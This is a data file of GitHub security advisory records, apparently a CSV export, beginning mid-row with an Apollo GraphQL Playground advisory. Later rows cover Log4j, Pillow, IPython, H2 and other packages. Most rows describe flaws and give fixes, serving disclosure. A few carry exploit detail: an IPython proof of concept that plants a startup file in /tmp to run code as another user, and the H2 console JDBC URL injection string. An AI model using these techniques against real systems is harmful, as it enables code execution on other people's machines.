- **Apollo Server 2 with `playground: true` or `playground: {x, y, z}`**: If you are using Apollo Server 2 and currently pass `true` or an object to `new ApolloServer`, pass the `version` option under the `playground` option like so:
```
new ApolloServer({ playground: { version: '1.7.42', x, y, z } })
```

#### Disable GraphQL Playground

If upgrading Apollo Server or GraphQL Playground is challenging, you can also disable GraphQL Playground.

In Apollo Server 3, remove the call to `ApolloServerPluginLandingPageGraphQLPlayground` from your `ApolloServer` constructor's `plugins` array. This will replace GraphQL Playground with a simple splash page. See [the landing page plugins docs](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/) for details.

In Apollo Server 2, add `playground: false` to your `ApolloServer` constructor: `new ApolloServer({ playground: false })`. This will replace GraphQL Playground with an attempt to execute a GraphQL operation, which will likely display an error in the browser.

If you disable GraphQL Playground, any users who rely on it to execute GraphQL operations will need an alternative, such as the [Apollo Studio Explorer's account-free Sandbox](https://www.apollographql.com/docs/studio/explorer/#account-free-sandbox).

### Credit

This vulnerability was discovered by @Ry0taK. Thank you!

The fix to GraphQL Playground was developed by @acao and @glasser with help from @imolorhe, @divyenduz, and @benjie.


### For more information
If you have any questions or comments about this advisory:
* Read the [`graphql-playground` advisory](https://github.com/graphql/graphql-playground/security/advisories/GHSA-59r9-6jp6-jcm7)
* Open an issue in [the `apollo-server` repo](https://github.com/apollographql/apollo-server/)
* If the issue involves confidential information, email us at [security@apollographql.com](mailto:security@apollographql.com)
",npm
1972,16813,rc,GHSA-g2q5-5433-rhrf,,https://github.com/advisories/GHSA-g2q5-5433-rhrf,critical,2021-11-04 16:24:44 UTC,Embedded malware in rc,"The npm package `rc` had versions published with malicious code. Users of affected versions (1.2.9, 1.3.9, and 2.3.9) should downgrade to 1.2.8 as soon as possible and check their systems for suspicious activity.
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",npm
1973,28766,jupyterhub,GHSA-cw7p-q79f-m2v7,CVE-2021-41247,https://github.com/advisories/GHSA-cw7p-q79f-m2v7,low,2021-11-08 18:02:37 UTC,incomplete JupyterHub logout with simultaneous JupyterLab sessions,"### Impact

Users of JupyterLab with JupyterHub who have multiple JupyterLab tabs open in the same browser session, may see incomplete logout from the single-user server, as fresh credentials (for the single-user server only, not the Hub) reinstated after logout, if another active JupyterLab session is open while the logout takes place.

### Patches

Upgrade to JupyterHub 1.5. For distributed deployments, it is jupyterhub in the _user_ environment that needs patching. There are no patches necessary in the Hub environment.

### Workarounds

The only workaround is to make sure that only one JupyterLab tab is open when you log out.",pip
1974,13154,Hangfire.Core,GHSA-7rq6-7gv8-c37h,CVE-2021-41238,https://github.com/advisories/GHSA-7rq6-7gv8-c37h,high,2021-11-03 17:30:59 UTC,Missing Authorization with Default Settings in Dashboard UI,"Dashboard UI in Hangfire.Core uses authorization filters to protect it from showing sensitive data to unauthorized users. By default when no custom authorization filters specified, `LocalRequestsOnlyAuthorizationFilter` filter is being used to allow only local requests and prohibit all the remote requests to provide sensible, protected by default settings.

However due to the recent changes, in version 1.7.25 no authorization filters are used by default, allowing remote requests to succeed.

### Impact

Missing authorization when default options are used for the Dashboard UI, e.g. when no custom authorization rules are used as recommended in the [Using Dashboard](https://docs.hangfire.io/en/latest/configuration/using-dashboard.html#configuring-authorization) documentation article. 

#### Impacted

If you are using `UseHangfireDashboard` method with default `DashboardOptions.Authorization` property value, then your installation is impacted:

```csharp
app.UseHangfireDashboard(); // Impacted
app.UseHangfireDashboard(""/hangfire"", new DashboardOptions()); // Impacted
```

#### Not Impacted

If any other authorization filter is specified in the `DashboardOptions.Authorization` property, the you are not impacted:

```csharp
app.UseHangfireDashboard(""/hangfire"", new DashboardOptions
{
    Authorization = new []{ new SomeAuthorizationFilter(); } // Not impacted
});
```

### Patches

Patch is already available in version [1.7.26](https://github.com/HangfireIO/Hangfire/releases/tag/v1.7.26) and already available on NuGet.org, please see [Hangfire.Core 1.7.26](https://www.nuget.org/packages/Hangfire.Core/1.7.26). Default authorization rules now prohibit remote requests by default again by including the `LocalRequestsOnlyAuthorizationFilter` filter to the default settings. Please upgrade to the newest version in order to mitigate the issue.

### Workarounds

It is possible to fix the issue by using the `LocalRequestsOnlyAuthorizationFilter` explicitly when configuring the Dashboard UI. In this case upgrade is not required.

```csharp
// using Hangfire.Dashboard;

app.UseHangfireDashboard(""/hangfire"", new DashboardOptions
{
    Authorization = new []{ new LocalRequestsOnlyAuthorizationFilter(); }
});
```

### References

Original GitHub Issue: https://github.com/HangfireIO/Hangfire/issues/1958",nuget
1975,19844,Pillow,GHSA-p49h-hjvm-jg3h,CVE-2020-5312,https://github.com/advisories/GHSA-p49h-hjvm-jg3h,high,2021-11-03 18:05:04 UTC,PCX P mode buffer overflow in Pillow,libImaging/PcxDecode.c in Pillow before 6.2.2 has a PCX P mode buffer overflow.,pip
1976,19844,Pillow,GHSA-3xv8-3j54-hgrp,CVE-2020-10378,https://github.com/advisories/GHSA-3xv8-3j54-hgrp,moderate,2021-11-03 18:04:53 UTC,Out-of-bounds read in Pillow,"In libImaging/PcxDecode.c in Pillow before 6.2.3 and 7.x before 7.0.1, an out-of-bounds read can occur when reading PCX files where state->shuffle is instructed to read beyond state->buffer.",pip
1977,19844,Pillow,GHSA-vcqg-3p29-xw73,CVE-2020-5310,https://github.com/advisories/GHSA-vcqg-3p29-xw73,moderate,2021-11-03 18:04:41 UTC,Integer overflow in Pillow,"libImaging/TiffDecode.c in Pillow before 6.2.2 has a TIFF decoding integer overflow, related to realloc.",pip
1978,16255,validator,GHSA-qgmg-gppg-76g5,CVE-2021-3765,https://github.com/advisories/GHSA-qgmg-gppg-76g5,moderate,2021-11-03 17:34:45 UTC,Inefficient Regular Expression Complexity in validator.js,validator.js prior to 13.7.0 is vulnerable to Inefficient Regular Expression Complexity,npm
1979,34258,org.apache.mina:mina-core,GHSA-6mcm-j9cj-3vc3,CVE-2021-41973,https://github.com/advisories/GHSA-6mcm-j9cj-3vc3,moderate,2021-11-03 17:30:35 UTC,Infinite loop in Apache MINA,"In Apache MINA, a specifically crafted, malformed HTTP request may cause the HTTP Header decoder to loop indefinitely. The decoder assumed that the HTTP Header begins at the beginning of the buffer and loops if there is more data than expected. Please update MINA to 2.1.5 or greater.",maven
1980,18135,tinymce,GHSA-r8hm-w5f7-wj39,,https://github.com/advisories/GHSA-r8hm-w5f7-wj39,moderate,2021-11-02 15:42:52 UTC,Cross-site scripting vulnerability in TinyMCE plugins,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in the URL processing logic of the `image` and `link` plugins. The vulnerability allowed arbitrary JavaScript execution when updating an image or link using a specially crafted URL. This issue only impacted users while editing and the dangerous URLs were stripped in any content extracted from the editor. This impacts all users who are using TinyMCE 5.9.2 or lower.

### Patches
This vulnerability has been patched in TinyMCE 5.10.0 by improved sanitization logic when updating URLs in the relevant plugins.

### Workarounds
To work around this vulnerability, either:
- Upgrade to TinyMCE 5.10.0 or higher
- Disable the `image` and `link` plugins

### Acknowledgements
Tiny Technologies would like to thank Yakir6 for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes510/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)",npm
1981,22243,kubernetes,GHSA-f5f7-6478-qm6p,CVE-2021-25741,https://github.com/advisories/GHSA-f5f7-6478-qm6p,high,2021-11-01 17:32:28 UTC,Files or Directories Accessible to External Parties in kubernetes,"A security issue was discovered in Kubernetes where a user may be able to create a container with subpath volume mounts to access files & directories outside of the volume, including on the host filesystem.",go
1982,18889,fluentd,GHSA-hwhf-64mh-r662,CVE-2021-41186,https://github.com/advisories/GHSA-hwhf-64mh-r662,moderate,2021-11-01 19:16:31 UTC,ReDoS vulnerability in parser_apache2,"### Impact
parser_apache2 plugin in Fluentd v0.14.14 to v1.14.1 suffers from a regular expression denial of service (ReDoS) vulnerability. A broken apache log with a certain pattern of string can spend too much time in a regular expression, resulting in the potential for a DoS attack.

### Patches
v1.14.2

### Workarounds
Either of the following:

* Don't use parser_apache2 for parsing logs which cannot guarantee generated by Apache.
* Put patched version of parser_apache2.rb into /etc/fluent/plugin  directory (or any other directories specified by the environment variable `FLUENT_PLUGIN` or `--plugin` option of fluentd).

### References
* [CVE-2021-41186](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41186)
* [GHSA-hwhf-64mh-r662](https://github.com/fluent/fluentd/security/advisories/GHSA-hwhf-64mh-r662)
* [GHSL-2021-102](https://securitylab.github.com/advisories/GHSL-2021-102-fluent-fluentd/)
* https://github.com/fluent/fluentd/blob/master/CHANGELOG.md#v1142
",rubygems
1983,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-v585-23hc-c647,CVE-2020-36186,https://github.com/advisories/GHSA-v585-23hc-c647,high,2021-11-19 20:13:06 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource.",maven
1984,15897,shelljs,GHSA-4rq4-32rv-6wp6,CVE-2022-0144,https://github.com/advisories/GHSA-4rq4-32rv-6wp6,high,2022-01-21 23:37:28 UTC,Improper Privilege Management in shelljs,shelljs is vulnerable to Improper Privilege Management,npm
1985,15908,colors,GHSA-gh88-3pxp-6fm8,CVE-2021-23567,https://github.com/advisories/GHSA-gh88-3pxp-6fm8,high,2022-01-21 23:39:50 UTC,Infinite Loop in colors.js,"The package colors after 1.4.0 are vulnerable to Denial of Service (DoS) that was introduced through an infinite loop in the americanFlag module. Unfortunately this appears to have been a purposeful attempt by a maintainer of colors to make the package unusable, other maintainers' controls over this package appear to have been revoked in an attempt to prevent them from fixing the issue. Vulnerable Code js for (let i = 666; i < Infinity; i++;) { Alternative Remediation Suggested * Pin dependancy to 1.4.0",npm
1986,33908,com.h2database:h2,GHSA-45hx-wfhj-473x,CVE-2022-23221,https://github.com/advisories/GHSA-45hx-wfhj-473x,critical,2022-01-21 23:07:39 UTC,Arbitrary code execution in H2 Console,"H2 Console before 2.1.210 allows remote attackers to execute arbitrary code via a jdbc:h2:mem JDBC URL containing the IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT substring, a different vulnerability than CVE-2021-42392.",maven
1987,16355,log4js,GHSA-82v2-mx6x-wq7q,CVE-2022-21704,https://github.com/advisories/GHSA-82v2-mx6x-wq7q,moderate,2022-01-21 18:53:27 UTC,Incorrect Default Permissions in log4js,"### Impact
Default file permissions for log files created by the file, fileSync and dateFile appenders are world-readable (in unix). This could cause problems if log files contain sensitive information. This would affect any users that have not supplied their own permissions for the files via the mode parameter in the config.

### Patches
Fixed by:
* https://github.com/log4js-node/log4js-node/pull/1141
* https://github.com/log4js-node/streamroller/pull/87

Released to NPM in log4js@6.4.0

### Workarounds
Every version of log4js published allows passing the mode parameter to the configuration of file appenders, see the documentation for details.

### References

Thanks to [ranjit-git](https://www.huntr.dev/users/ranjit-git) for raising the issue, and to @lamweili for fixing the problem.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [logj4s-node](https://github.com/log4js-node/log4js-node)
* Ask a question in the [slack channel](https://join.slack.com/t/log4js-node/shared_invite/enQtODkzMDQ3MzExMDczLWUzZmY0MmI0YWI1ZjFhODY0YjI0YmU1N2U5ZTRkOTYyYzg3MjY5NWI4M2FjZThjYjdiOGM0NjU2NzBmYTJjOGI)
* Email us at [gareth.nomiddlename@gmail.com](mailto:gareth.nomiddlename@gmail.com)
",npm
1988,33876,log4j:log4j,GHSA-65fg-84f6-3jq3,CVE-2022-23305,https://github.com/advisories/GHSA-65fg-84f6-3jq3,critical,2022-01-21 23:26:47 UTC,SQL Injection in Log4j 1.2.x,"By design, the JDBCAppender in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from PatternLayout. The message converter, %m, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed. Note this issue only affects Log4j 1.x when specifically configured to use the JDBCAppender, which is not the default. Beginning in version 2.0-beta8, the JDBCAppender was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.",maven
1989,33876,log4j:log4j,GHSA-w9p3-5cr8-m3jj,CVE-2022-23302,https://github.com/advisories/GHSA-w9p3-5cr8-m3jj,high,2022-01-21 23:27:14 UTC,Deserialization of Untrusted Data in Log4j 1.x,"JMSSink in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a TopicConnectionFactoryBindingName configuration causing JMSSink to perform JNDI requests that result in remote code execution in a similar fashion to CVE-2021-4104. Note this issue only affects Log4j 1.x when specifically configured to use JMSSink, which is not the default. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.",maven
1990,19892,ipython,GHSA-pq7m-3gw7-gq5x,CVE-2022-21699,https://github.com/advisories/GHSA-pq7m-3gw7-gq5x,high,2022-01-21 18:55:30 UTC,Execution with Unnecessary Privileges in ipython,"We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.
 
Proof of concept

User1:
```
mkdir -m 777 /tmp/profile_default
mkdir -m 777 /tmp/profile_default/startup
echo 'print(""stealing your private secrets"")' > /tmp/profile_default/startup/foo.py
```

User2:
```
cd /tmp
ipython
```

 

User2 will see:
```
Python 3.9.7 (default, Oct 25 2021, 01:04:21)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.
stealing your private secrets
```


## Patched release and documentation

See https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699, 

Version 8.0.1, 7.31.1 for current Python version are recommended. 
Version 7.16.3 has also been published for Python 3.6 users, 
Version 5.11 (source only, 5.x branch on github) for older Python versions.",pip
1991,34341,com.hazelcast:hazelcast,GHSA-v57x-gxfj-484q,,https://github.com/advisories/GHSA-v57x-gxfj-484q,critical,2022-01-21 23:25:04 UTC,"Security Advisory for ""Log4Shell""","### Impact
A highly critical 0-day exploit (CVE-2021-44228) is found in Apache log4j 2 library on December 9, 2021.

This affects Apache log4j versions from 2.0-beta9 to 2.14.1 (inclusive). 

This vulnerability allows a remote attacker to execute code on the server if the system logs an attacker-controlled string value with the attacker's JNDI LDAP server lookup.

Another vulnerability related to the same library, which was discovered on 12/14/2021 (CVE-2021-45046) and revealed another Remote Code Execution vulnerability, has been investigated by Hazelcast team as well and it is found that it does not affect Hazelcast Products under default configurations. 

The finding of CVE-2021-45105 on 12/14/2021, which can cause a Denial of Service attack, was investigated by Hazelcast team and it is confirmed that it does not affect Hazelcast Products under default configurations. 

The finding of CVE-2021-44832 on 12/28/2021, which is a medium vulnerability, is investigated by our security team as well, and not considered to be as critical. It requires attacker to be able to modify logging configuration, which means attacker can modify the filesystem and/or can already execute arbitrary code which is more of a general security breach rather than something log4j specific.

Note that Hazelcast IMDG and IMDG Enterprise itself is not affected.

However, given version distributions are considered to be vulnerable since related ZIP and TGZ distributions contain a vulnerable Hazelcast Management Center version.

### Patches
CVE-2021-44228 is fixed in log4j 2.15.0.
CVE-2021-45046 is fixed in log4j 2.16.0.
CVE-2021-45105 is fixed in log4j 2.17.0.
CVE-2021-44832 is fixed in log4j 2.17.1.

As of 12/21/2021, Hazelcast team has released a new version of all affected products that upgrades log4j to 2.17.0 as listed below: 
Hazelcast Management Center 4.2021.12-1, Hazelcast Management Center 5.0.4.
Hazelcast IMDG and IMDG Enterprise 4.0.5, 4.1.8 and 4.2.4.
Hazelcast Jet 4.5.3.
Hazelcast Platform 5.0.2.

As of 01/06/2022, Hazelcast Management Center 4.2022.01 with the updated log4j 2.17.1 is released. log4j2.17.1 will be included in Management Center 5.1 that is expected to be released in February. 

Hazelcast recommends upgrading to the latest versions available.

### Workarounds
For users that an upgrade is not an option, below mitigations can be applied.

#### Disabling lookups via Environment Variable 
Setting the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true .
This option is the easiest to apply for containerized environments.

#### Disabling lookups in log4j2 configuration
Another good option since there is no need to replace JARs or no need to modify logging configuration file, users who cannot upgrade to 2.17.0 can mitigate the exposure by:

Users of Log4j 2.10 or greater may add `-Dlog4j2.formatMsgNoLookups=true `as a command line option or add `-Dlog4j2.formatMsgNoLookups=true` in a `log4j2.component.properties` file on the classpath to prevent lookups in log event messages.
Users since Log4j 2.7 may specify `%m{nolookups}` in the PatternLayout configuration to prevent lookups in log event messages.
As an example; users deploying Hazelcast Management Center via helm charts can do the following to disable lookups and restart in one command:

`helm upgrade <release-name> hazelcast/hazelcast --set mancenter.javaOpts=""<javaOpts> -Dlog4j2.formatMsgNoLookups=true""`

Where <release-name> is the release name and <javaOpts> is existing java options user has added previously.

#### Removing the JndiLookup from classpath
Remove the JndiLookup and JndiManager classes from the log4j-core jar. Note that removal of the JndiManager will cause the JndiContextSelector and JMSAppender to no longer function.

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-44228
https://nvd.nist.gov/vuln/detail/CVE-2021-45046
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105
https://nvd.nist.gov/vuln/detail/CVE-2021-44832
https://logging.apache.org/log4j/2.x/index.html

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [our repo](https://github.com/hazelcast/hazelcast)
* Slack us at [Hazelcast Community Slack](https://slack.hazelcast.com/)
",maven
1992,35054,edu.stanford.nlp:stanford-corenlp,GHSA-75vw-3m5v-fprh,CVE-2022-0239,https://github.com/advisories/GHSA-75vw-3m5v-fprh,critical,2022-01-21 23:43:11 UTC,corenlp is vulnerable to Improper Restriction of XML External Entity Reference,corenlp is vulnerable to Improper Restriction of XML External Entity Reference,maven
1993,15978,node-fetch,GHSA-r683-j2x4-v87g,CVE-2022-0235,https://github.com/advisories/GHSA-r683-j2x4-v87g,high,2022-01-21 23:55:52 UTC,node-fetch is vulnerable to Exposure of Sensitive Information to an Unauthorized Actor,node-fetch is vulnerable to Exposure of Sensitive Information to an Unauthorized Actor,npm
1994,17208,nanoid,GHSA-qrpm-p2h7-hrv2,CVE-2021-23566,https://github.com/advisories/GHSA-qrpm-p2h7-hrv2,moderate,2022-01-21 23:57:06 UTC,Exposure of Sensitive Information to an Unauthorized Actor in nanoid,"The package nanoid from 3.0.0, before 3.1.31, are vulnerable to Information Exposure via the valueOf() function which allows to reproduce the last id generated.",npm
1995,20088,wagtail,GHSA-xqxm-2rpm-3889,CVE-2022-21683,https://github.com/advisories/GHSA-xqxm-2rpm-3889,low,2022-01-21 23:43:50 UTC,Comment reply notifications sent to incorrect users,"### Impact
When notifications for new replies in comment threads are sent, they are sent to all users who have replied or commented anywhere on the site, rather than only in the relevant threads. This means that a user could listen in to new comment replies on pages they have not had editing access to, as long as they have left a comment or reply somewhere on the site.

### Patches
A patched version has been released as Wagtail 2.15.2 (for the current LTS), which restores the intended behaviour - to send notifications for new replies to the participants in the active thread only (editing permissions are not considered).

### Workarounds
New comments can be disabled by setting `WAGTAILADMIN_COMMENTS_ENABLED = False` in the Django settings file.

### Acknowledgements

Many thanks to Ihor Marhitych for identifying this issue.

### For more information
If you have any questions or comments about this advisory:

* Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)
* Email us at security@wagtail.io (if you wish to send encrypted email, the public key ID is `0x6ba1e1a86e0f8ce8`)
",pip
1996,17082,node-forge,GHSA-8fr3-hfg3-gpgp,CVE-2022-0122,https://github.com/advisories/GHSA-8fr3-hfg3-gpgp,moderate,2022-01-21 23:36:19 UTC,Open Redirect in node-forge,parseUrl functionality in node-forge mishandles certain uses of backslash such as https:/\/\/\ and interprets the URI as a relative path.,npm
1997,20357,ujson,GHSA-fh56-85cw-5pq6,CVE-2021-45958,https://github.com/advisories/GHSA-fh56-85cw-5pq6,moderate,2022-01-21 23:27:45 UTC,UltraJSON vulnerable to Out-of-bounds Write,UltraJSON (aka ujson) 1.34 through 5.1.0 has a stack-based buffer overflow in Buffer_AppendIndentUnchecked (called from encode).,pip
1998,16653,three,GHSA-7vvq-7r29-5vg3,CVE-2022-0177,https://github.com/advisories/GHSA-7vvq-7r29-5vg3,high,2022-01-27 16:00:48 UTC,Cross site scripting in three.js,"# CVE has been withdrawn

Versions of three.js prior to 0.137.0 load untrusted iframes and allow for attackers to inject arbitrary javascript into a users browser.

",npm
1999,29563,jupyter-server-proxy,GHSA-gcv9-6737-pjqw,CVE-2022-21697,https://github.com/advisories/GHSA-gcv9-6737-pjqw,moderate,2022-01-27 16:24:26 UTC,SSRF vulnerability in jupyter-server-proxy,"### Impact

**What kind of vulnerability is it?**  Server-Side Request Forgery ( SSRF )

**Who is impacted?** Any user deploying Jupyter Server or Notebook with jupyter-proxy-server extension enabled. 

A lack of input validation allowed authenticated clients to proxy requests to other hosts, bypassing the `allowed_hosts` check. Because authentication is required, which already grants permissions to make the same requests via kernel or terminal execution, this is considered low to moderate severity.


### Patches

_Has the problem been patched? What versions should users upgrade to?_

Upgrade to 3.2.1, or apply the patch https://github.com/jupyterhub/jupyter-server-proxy/compare/v3.2.0...v3.2.1.patch

### For more information

If you have any questions or comments about this advisory:

* Open a topic [on our forum](https://discourse.jupyter.org)
* Email the Jupyter security team at [security@ipython.org](mailto:security@ipython.org)
",pip
2000,33974,xerces:xercesImpl,GHSA-h65f-jvqw-m9fj,CVE-2022-23437,https://github.com/advisories/GHSA-h65f-jvqw-m9fj,moderate,2022-01-27 16:13:07 UTC,Infinite Loop in Apache Xerces Java,"There's a vulnerability within the Apache Xerces Java (XercesJ) XML parser when handling specially crafted XML document payloads. This causes, the XercesJ XML parser to wait in an infinite loop, which may sometimes consume system resources for prolonged duration. This vulnerability is present within XercesJ version 2.12.1 and the previous versions.",maven
2001,18948,sidekiq,GHSA-jrfj-98qg-qjgv,CVE-2022-23837,https://github.com/advisories/GHSA-jrfj-98qg-qjgv,high,2022-01-27 14:42:37 UTC,Denial of service in sidekiq,"In api.rb in Sidekiq before 6.4.0 and 5.2.10, there is no limit on the number of days when requesting stats for the graph. This overloads the system, affecting the Web UI, and makes it unavailable to users.",rubygems
2002,31157,graphql-go,GHSA-mh3m-8c74-74xh,CVE-2022-21708,https://github.com/advisories/GHSA-mh3m-8c74-74xh,moderate,2022-01-27 15:28:06 UTC,Denial of Service in graphql-go,"### Impact
This is a DoS vulnerability that is possible due to a bug in the library that would allow an attacker with specifically designed queries to cause stack overflow panics. Any user with access to the GraphQL handler can send these queries and cause stack overflows. This in turn could potentially compromise the ability of the server to serve data to its users. To make things worse the only mitigation in affected versions creates opportunities for other attacks. This issue is only available if you are using `graphql.MaxDepth` option in your schema (which is highly recommended in most cases).

### Patches
The issue has been patched in version `v1.3.0`. We have been trying to maintain backwards compatibility and avoid breaking changes so upgrading should not be problematic. 

### Workarounds
The best workaround is to patch to a version greater than or equal to `v1.3.0`. 
Otherwise, the only workaround in versions prior to `v1.3.0` is to disable the `graphql.MaxDepth` option from your schema. Unfortunately, this could potentially create opportunities for other attacks.

### References
There are no references or links. This issue was reported privately and was fixed before creating this Security Advisory.

### For more information
If you have any questions or comments feel free to reach out to @pavelnikolov or @tony on the Gopher Slack.",go
2003,16278,nodemailer,GHSA-hwqf-gcqm-7353,CVE-2021-23400,https://github.com/advisories/GHSA-hwqf-gcqm-7353,moderate,2021-12-10 18:56:57 UTC,Header injection in nodemailer,The package nodemailer before 6.6.1 are vulnerable to HTTP Header Injection if unsanitized user input that may contain newlines and carriage returns is passed into an address object.,npm
2004,34486,org.bouncycastle:bcprov-jdk16,GHSA-6xx3-rg99-gc3p,CVE-2020-15522,https://github.com/advisories/GHSA-6xx3-rg99-gc3p,moderate,2021-08-13 15:22:31 UTC,Timing based private key exposure in Bouncy Castle,"Bouncy Castle BC Java before 1.66, BC C# .NET before 1.8.7, BC-FJA before 1.0.2.1, BC before 1.66, BC-FNA before 1.0.1.1 have a timing issue within the EC math library that can expose information about the private key when an attacker is able to observe timing information for the generation of multiple deterministic ECDSA signatures.",maven
2005,34021,org.bouncycastle:bcprov-jdk15on,GHSA-6xx3-rg99-gc3p,CVE-2020-15522,https://github.com/advisories/GHSA-6xx3-rg99-gc3p,moderate,2021-08-13 15:22:31 UTC,Timing based private key exposure in Bouncy Castle,"Bouncy Castle BC Java before 1.66, BC C# .NET before 1.8.7, BC-FJA before 1.0.2.1, BC before 1.66, BC-FNA before 1.0.1.1 have a timing issue within the EC math library that can expose information about the private key when an attacker is able to observe timing information for the generation of multiple deterministic ECDSA signatures.",maven
2006,35085,org.bouncycastle:bcprov-jdk15,GHSA-6xx3-rg99-gc3p,CVE-2020-15522,https://github.com/advisories/GHSA-6xx3-rg99-gc3p,moderate,2021-08-13 15:22:31 UTC,Timing based private key exposure in Bouncy Castle,"Bouncy Castle BC Java before 1.66, BC C# .NET before 1.8.7, BC-FJA before 1.0.2.1, BC before 1.66, BC-FNA before 1.0.1.1 have a timing issue within the EC math library that can expose information about the private key when an attacker is able to observe timing information for the generation of multiple deterministic ECDSA signatures.",maven
2007,37675,org.bouncycastle:bcprov-jdk14,GHSA-6xx3-rg99-gc3p,CVE-2020-15522,https://github.com/advisories/GHSA-6xx3-rg99-gc3p,moderate,2021-08-13 15:22:31 UTC,Timing based private key exposure in Bouncy Castle,"Bouncy Castle BC Java before 1.66, BC C# .NET before 1.8.7, BC-FJA before 1.0.2.1, BC before 1.66, BC-FNA before 1.0.1.1 have a timing issue within the EC math library that can expose information about the private key when an attacker is able to observe timing information for the generation of multiple deterministic ECDSA signatures.",maven
2008,23037,xz,GHSA-q6gq-997w-f55g,CVE-2020-16845,https://github.com/advisories/GHSA-q6gq-997w-f55g,high,2021-12-16 19:16:40 UTC,Infinite loop in xz,Go before 1.13.15 and 14.x before 1.14.7 can have an infinite read loop in ReadUvarint and ReadVarint in encoding/binary via invalid inputs.,go
2009,20276,Plone,GHSA-77hv-8796-8ccp,CVE-2012-5486,https://github.com/advisories/GHSA-77hv-8796-8ccp,moderate,2018-07-23 19:51:50 UTC,Moderate severity vulnerability that affects Plone and Zope2,"ZPublisher.HTTPRequest._scrubHeader in Zope 2 before 2.13.19, as used in Plone before 4.3 beta 1, allows remote attackers to inject arbitrary HTTP headers via a linefeed (LF) character.",pip
2010,20276,Plone,GHSA-3qpr-7rmg-73v8,CVE-2012-5507,https://github.com/advisories/GHSA-3qpr-7rmg-73v8,moderate,2018-07-23 19:51:02 UTC,Moderate severity vulnerability that affects Plone and Zope2,"AccessControl/AuthEncoding.py in Zope before 2.13.19, as used in Plone before 4.2.3 and 4.3 before beta 1, allows remote attackers to obtain passwords via vectors involving timing discrepancies in password validation.",pip
2011,20276,Plone,GHSA-48vv-2pmq-9fvv,CVE-2012-6661,https://github.com/advisories/GHSA-48vv-2pmq-9fvv,moderate,2018-07-23 19:51:14 UTC,Moderate severity vulnerability that affects Plone and Zope2,"Zope before 2.13.19, as used in Plone before 4.2.3 and 4.3 before beta 1, does not reseed the pseudo-random number generator (PRNG), which makes it easier for remote attackers to guess the value via unspecified vectors.  NOTE: this issue was SPLIT from CVE-2012-5508 due to different vulnerability types (ADT2).",pip
2012,20276,Plone,GHSA-879r-7f3w-8jj3,CVE-2012-5489,https://github.com/advisories/GHSA-879r-7f3w-8jj3,moderate,2018-07-23 19:52:06 UTC,Moderate severity vulnerability that affects Plone and Zope2,"The App.Undo.UndoSupport.get_request_var_or_attr function in Zope before 2.12.21 and 3.13.x before 2.13.11, as used in Plone before 4.2.3 and 4.3 before beta 1, allows remote authenticated users to gain access to restricted attributes via unspecified vectors.",pip
2013,16344,acorn,GHSA-7fhm-mqm4-2wp7,,https://github.com/advisories/GHSA-7fhm-mqm4-2wp7,moderate,2020-03-13 20:36:16 UTC,Withdrawn: ESLint dependencies are vulnerable (ReDoS and Prototype Pollution),"**Withdrawn**
GitHub has withdrawn this advisory in place of GHSA-vh95-rmgr-6w4m and GHSA-6chw-6frg-f759.
The reason for withdrawing is that some mistakes were made during the ingestion of CVE-2020-7598
which caused this advisory to be published with incorrect information.

In order to provide accurate advisory information, new advisories were created:

- minimist: https://github.com/advisories/GHSA-vh95-rmgr-6w4m
- acorn: https://github.com/advisories/GHSA-6chw-6frg-f759",npm
2014,33929,ch.qos.logback:logback-core,GHSA-vmfg-rjjm-rjrj,CVE-2017-5929,https://github.com/advisories/GHSA-vmfg-rjjm-rjrj,critical,2021-06-07 16:07:36 UTC,Deserialization of Untrusted Data,"QOS.ch Logback before 1.2.0 has a serialization vulnerability affecting the SocketServer and ServerSocketReceiver components. The RemoteStreamAppenderClient class in logback-classic and the SocketNode classes in logback-classic and logback-access allow data to be deserialized over a Java Socket, via an ObjectInputStream, without validating the data beforehand. When data is received from the Socket, to be logged, it is deserialized into Java objects.An attacker can exploit this vulnerability by sending malicious, serialized Java objects over the connection to the Socket, which may result in execution of arbitrary code when those objects are deserialized. Note that although logback-core is implicated by the Logback project here, the Sonatype Security Research team discovered that the vulnerability is actually present in the logback-classic and logback-access components. Versions prior to 1.2.0 are vulnerable, as stated in the advisory.",maven
